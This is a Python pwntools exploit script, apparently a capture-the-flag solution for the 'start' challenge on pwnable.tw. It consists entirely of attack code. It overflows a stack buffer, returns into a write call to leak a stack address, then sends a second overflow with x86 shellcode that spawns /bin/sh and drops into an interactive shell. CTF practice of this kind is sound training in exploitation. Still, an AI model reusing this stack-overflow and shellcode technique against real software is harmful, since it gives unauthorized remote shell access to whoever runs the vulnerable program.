from pwn import *

#r = process('./start')
r = remote('chall.pwnable.tw', 10000)

sys_write = 0x08048087
#input()
payload = b'a'*0x14 + p32(sys_write)
r.sendafter(b"Let's start the CTF:", payload)

leak_stack = u32(r.recv(1024)[0:4])
print("Stack: ", hex(leak_stack))
shellcode =b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
payload = b'a'*0x14 + p32(leak_stack + 0x14) + shellcode
r.send(payload)

r.interactive()
